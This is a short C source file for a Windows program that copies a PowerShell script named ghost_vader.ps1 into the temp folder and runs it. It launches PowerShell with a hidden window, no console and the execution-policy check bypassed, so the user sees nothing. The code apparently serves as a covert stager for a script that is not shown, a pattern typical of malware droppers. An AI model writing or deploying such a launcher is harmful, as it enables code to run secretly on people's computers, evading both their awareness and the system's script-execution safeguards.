#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    char temp[MAX_PATH], ps1[MAX_PATH], run[2048];
    GetTempPathA(MAX_PATH, temp);
    snprintf(ps1, MAX_PATH, "%sghost_vader.ps1", temp);

    /* Extract ghost.ps1 from same directory as exe */
    char dir[MAX_PATH], src[MAX_PATH];
    GetModuleFileNameA(NULL, dir, MAX_PATH);
    char *slash = strrchr(dir, '\\');
    if (slash) *(slash+1) = 0;
    snprintf(src, MAX_PATH, "%sghost_vader.ps1", dir);
    CopyFileA(src, ps1, FALSE);

    snprintf(run, 2048,
        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%s\"",
        ps1);

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, run, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
